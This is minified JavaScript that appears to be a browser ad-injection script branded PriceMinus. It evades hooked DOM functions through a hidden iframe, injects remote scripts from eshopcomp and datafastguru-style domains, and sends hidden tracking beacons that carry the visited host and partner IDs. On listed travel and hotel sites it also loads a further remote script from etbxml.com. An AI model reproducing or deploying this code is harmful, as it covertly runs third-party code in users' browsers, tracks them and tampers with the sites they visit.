new function(){window.FO_RB_IMG=0;window.FO_DOMAIN = ".eshopcomp.com";
var Injector=function(){function t(){}return t.getAltDocument=function(){if(null==t.altDocument){var e=document.createElement("iframe");e.height=e.width="0",document.body.appendChild(e),t.altDocument=e.contentWindow.document}return t.altDocument},t.retryOnFailure=function(e,n,r){try{e(function(i){0==n?r(i):t.retryOnFailure(e,n-1,r)},n)}catch(i){0==n?r(i):t.retryOnFailure(e,n-1,r)}},t.injectScriptWithRetries=function(e,n,r,i){void 0===i&&(i=!1),t.retryOnFailure(function(r,o){return t.injectScript(e+"?retries="+o,n,r,i)},3,r)},t.injectScript=function(e,n,r,i){void 0===i&&(i=!1);var o=null,a=!0,c=!1,d=document.createElement;d.toString().indexOf("[native code]")>0?o=document.createElement("script"):(o=t.getAltDocument().createElement.call(document,"script"),a=!1),o.onload=o.onreadystatechange=function(t){c||o.readyState&&"loaded"!==o.readyState&&"complete"!==o.readyState||(c=!0,i&&console.log("Injected script loaded"),n&&window.setTimeout(function(){n()},1))},o.onerror=function(t){c||(c=!0,i&&console.warn("Injected script failed",t),r&&window.setTimeout(function(){r(t)},1))};var u=document.getElementsByTagName("head")[0],l=u.appendChild;return l.toString().indexOf("[native code]")>0?u.appendChild(o):(t.getAltDocument().appendChild.call(u,o),a=!1),o.src=e,i&&console.log("Injected script "+e+". Using native functions: "+a),a},t.altDocument=null,t}(),BootstrapHelper=function(){function t(){}return t.bootstrap=function(e,n,r){void 0===r&&(r=[]);var i=!!window.FO_DEBUG;r&&r.length||(r=window.FO_DOMAIN?[window.FO_DOMAIN]:[".datafastguru.info"]);var o=t.selectDomain(r);t.notify(o,e,"inj",{},.01),t.notifyGenericUrl("https://secure.adnxs.com/seg?add=2735784&t=2");var a="//pstatic"+o+"/nwp/v0_0_603/release/Shared/App/SharedApp.js",c="FO.Shared_"+n+".App.SharedApp";t.retryOnFailure(function(n){return t.injectAndInstantiate(a,c,o,e,i,n)},3,function(n){return t.notify(o,e,"exception",{ex:"Failure to get SharedApp "+(n&&n.message)},.01)})},t.retryOnFailure=function(e,n,r){e(function(i){0==n?r(i):t.retryOnFailure(e,n-1,r)})},t.injectAndInstantiate=function(e,n,r,i,o,a){Injector.injectScript(e+"?t="+t.sharedAppTrialNum++,function(){try{var e=t.instantiateClass(n);e.init(i,r)}catch(c){o&&console.error(c),a(c)}},a,o)},t.notify=function(e,n,r,i,o){var a=Math.random()<o;if(a){var c="//app"+e+"/a/"+r+"/logo.png",d={};d.fam="nwp",d.t=(new Date).getTime()+"",d.v="0_0_603",d.dmn=e,d.partid=n.partnerCode,d.subid=n.subId,d.hn=document.location.host,d.safepassage="1";for(var u in i)d[u]=i[u];t.notifyGenericUrl(c,d)}},t.notifyGenericUrl=function(t,e){void 0===e&&(e={});try{if(e){t+="?";for(var n in e){var r=e[n]+"";t=t+"&"+n+"="+encodeURIComponent(r)}}var i=document.body.appendChild(document.createElement("img"));return i.style.zIndex="-100",i.style.position="absolute",i.style.left="0",i.style.top="0",i.src=t,!0}catch(o){return!1}},t.selectDomain=function(t){for(var e=[],n=0;n<t.length;n++)t[n]&&t[n].length&&-1==t[n].indexOf("$")&&e.push(t[n]);var n=Math.floor(Math.random()*e.length);return e[n]},t.instantiateClass=function(t){for(var e=t.split("."),n=window,r=0;r<e.length;r++)n=n[e[r]];var i=new n;return i},t.sharedAppTrialNum=0,t}(),params={"products":{"CommerceRightRibbon":[{"logic":["CommerceRibbonLogic"],"visual":"CommerceRightRibbonVisual","weight":10}],"GenericButtonY":[{"logic":["ImageDealsLogic"],"visual":"GenericButtonY","weight":10}]},partnerCode:"wp",subId:"1386_24389",providerName:"PriceMinus",providerLink:"",flags:{base:{"value":[{"name":"NotificationRates","flag":"","variants":[{"name":"Default","flagValue":"","odds":1,"values":[{"name":"notifyrate.inj","val":"0.01"},{"name":"notifyrate.exception","val":"0.001"},{"name":"notifyrate.init","val":"0.01"},{"name":"notifyrate.usr","val":"0.01"},{"name":"notifyrate.noshow","val":"0.01"},{"name":"notifyrate.wo","val":"0.1"},{"name":"notifyrate.generic.pb_result","val":"0.01"}]}]},{"name":"OffersApiPruning","flag":"oap","variants":[{"name":"Off","flagValue":"off","odds":0.8,"values":[{"name":"offersapi.prune","val":"0"}]},{"name":"TopHalf","flagValue":"top","odds":0.1,"values":[{"name":"offersapi.prune","val":"1"}]},{"name":"OverMedian","flagValue":"med","odds":0.1,"values":[{"name":"offersapi.prune","val":"2"}]}]},{"name":"newScrapeWeight","flag":"itai_scr_9","variants":[{"name":"old_scrape_values","flagValue":"set1","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv1","flagValue":"set2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv2","flagValue":"set3","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-1"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-1"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-1"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"1"}]},{"name":"ampv3","flagValue":"set4","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"-2"},{"name":"deal-scrape-weights-amplify.otherqs","val":"-1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"10"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-1"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment1","flagValue":"e1","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"10"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"15"},{"name":"deal-scrape-weights-amplify.ribbon","val":"6"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"8"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"OldExperiment2","flagValue":"e2","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"5"},{"name":"deal-scrape-weights-amplify.otherqs","val":"1"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"20"},{"name":"deal-scrape-weights-amplify.ribbon","val":"15"},{"name":"deal-scrape-weights-amplify.importantqs","val":"8"},{"name":"deal-scrape-weights-amplify.text","val":"1"},{"name":"deal-scrape-weights-amplify.h1","val":"14"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv4","flagValue":"set5","odds":0,"values":[{"name":"deal-scrape-weights-amplify.title","val":"6"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"-6"},{"name":"deal-scrape-weights-amplify.search","val":"8"},{"name":"deal-scrape-weights-amplify.ribbon","val":"10"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"-2"},{"name":"deal-scrape-weights-amplify.h1","val":"-6"},{"name":"dedicated-part-of-scrape","val":"0"}]},{"name":"ampv5","flagValue":"set6","odds":0.5,"values":[{"name":"deal-scrape-weights-amplify.title","val":"0"},{"name":"deal-scrape-weights-amplify.otherqs","val":"0"},{"name":"deal-scrape-weights-amplify.dedicated","val":"0"},{"name":"deal-scrape-weights-amplify.search","val":"10"},{"name":"deal-scrape-weights-amplify.ribbon","val":"20"},{"name":"deal-scrape-weights-amplify.importantqs","val":"20"},{"name":"deal-scrape-weights-amplify.text","val":"0"},{"name":"deal-scrape-weights-amplify.h1","val":"6"},{"name":"dedicated-part-of-scrape","val":"0"}]}]},{"name":"Scroll","flag":"ruby_scrollx1","variants":[{"name":"Auto10","flagValue":"a10","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"15000"}]},{"name":"Auto30","flagValue":"a30","odds":0.5,"values":[{"name":"rightslider.scroll-auto","val":"30000"}]}]},{"name":"DeafultMerchantImg","flag":"dfi","variants":[{"name":"UseDefault","flagValue":"use","odds":0,"values":[{"name":"deals.default-merchant-image","val":"1"}]},{"name":"NoDefault","flagValue":"no","odds":1,"values":[{"name":"deals.default-merchant-image","val":"0"}]}]},{"name":"PersistanceTest","flag":"","variants":[{"name":"Easy","flagValue":"","odds":1,"values":[{"name":"persistance.testset","val":"1"},{"name":"persistance.testratio","val":"0.001"}]}]},{"name":"ProductBoxes","flag":"usepb","variants":[{"name":"UsePB","flagValue":"1","odds":1,"values":[{"name":"productbox.userate","val":"1"}]},{"name":"DontUse","flagValue":"0","odds":0,"values":[{"name":"productbox.userate","val":"0"}]}]},{"name":"RibbonClassification","flag":"new_get_img2","variants":[{"name":"UseNewGetImgAlgo","flagValue":"1","odds":1,"values":[{"name":"classify-use-new-get-img-algo","val":"1"}]},{"name":"UseOldGetImgAlgo","flagValue":"0","odds":0,"values":[{"name":"classify-use-new-get-img-algo","val":"0"}]}]},{"name":"DictionaryClassification","flag":"disq_phrases","variants":[{"name":"UseDisqualifyingPhrases","flagValue":"1","odds":1,"values":[{"name":"use.disqualifying.phrases","val":"1"}]},{"name":"DontUseDisqPhrases","flagValue":"0","odds":0,"values":[{"name":"use.disqualifying.phrases","val":"0"}]}]},{"name":"ProductBoxes2","flag":"pb_scrape","variants":[{"name":"Old","flagValue":"old","odds":0.1,"values":[{"name":"productbox.newscrape","val":"0"}]},{"name":"New","flagValue":"new","odds":0.9,"values":[{"name":"productbox.newscrape","val":"1"}]}]}]},specific:{}}},version="0_0_603";BootstrapHelper.bootstrap(params,version);(function(){for(var a="Venere.com travelocity.com snoozee.com southwest.com lastminute.com hotelclub.com hotels.com hotels4u.com Expedia. getaroom.com ebookers.com cheaptickets.com booking.com bookit.com Agoda.com Priceline.com Orbitz.com Budgetplaces.com Hotwire.com makemytrip.com marriott.com Tripadvisor. kayak. trivago. hotelscombined. prestigia.com otel.com skoosh.com asiarooms.com bestwestern.com lasvegas.com www.amoma.com".split(" "),c=window.location.hostname.toLocaleLowerCase(),b=0;b<a.length;b++)if(-1<
    c.indexOf(a[b].toLowerCase())){a=document.createElement("script");a.src="//cond01.etbxml.com/api/web/hotels.php?ui=1&partner=first_t_t&ns=first_t_t&mamId=first_t_t&userId=2222&appId=3333&sp=0&apps=Targeted";document.body.appendChild(a);break}})();}